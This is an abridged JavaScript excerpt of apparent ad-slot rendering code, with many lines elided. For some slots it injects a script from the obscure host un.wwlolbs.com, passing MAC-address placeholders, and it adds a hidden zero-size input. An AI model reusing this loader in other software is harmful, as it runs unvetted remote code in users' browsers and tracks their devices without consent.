(function(window, document /*,undefined*/) {
  ...
  function p4CSDNTBootstrap(csdnRender, div, position) {
    ...
    xhr.addEventListener("load", function() {
      ...
      set360Title(item);
      // T38显示广告
      // if (position === "T38" && getIEVersion() > 20) {
      //   item["item_id"] = "-1";
      // }
      if ( position === "WAP3") {
        item["item_id"] = "-1";
  ...
  function renderSlotbydup(renderParentDom, position) {
    if (position === "T0") {
    ...
    } else if (position === "T3" || position === "T43" || position === "T48") {
      (function() {
      ...
      (function() {
        var scriptT3Dom = document.createElement("script");
        scriptT3Dom.src =
          "//un.wwlolbs.com/xay/12292.js?ydcp_id=12292&cumid=$mac_addr&apmac=$ap_mac";
        renderParentDom.innerHTML =
          '<input id="dib22" style="width: 0;height: 0px;opacity: 0;position: absolute;"></input><div id="_so_pcBy_0"></div>';
        renderParentDom.appendChild(scriptT3Dom);
      })();
    } else if (position === "T7") {
      ...
      renderParentDom.style.padding = "0.16rem 0.32rem 0 0.32rem";
      (function() {
